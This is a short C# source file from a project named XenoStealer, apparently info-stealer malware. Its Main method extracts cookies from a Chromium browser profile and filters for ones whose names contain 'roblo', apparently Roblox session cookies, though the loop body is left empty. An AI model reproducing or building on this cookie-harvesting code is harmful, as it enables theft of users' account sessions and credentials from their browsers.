using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {
            var f = Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.Cookies);
            foreach (DataExtractionStructs.ChromiumCookie i in f[0].profiles[0].cookies) 
            {
                if (i.name.ToLower().Contains("roblo")) 
                {
                    var c = "";
                }
            }
            var d = "";
        }
    }
}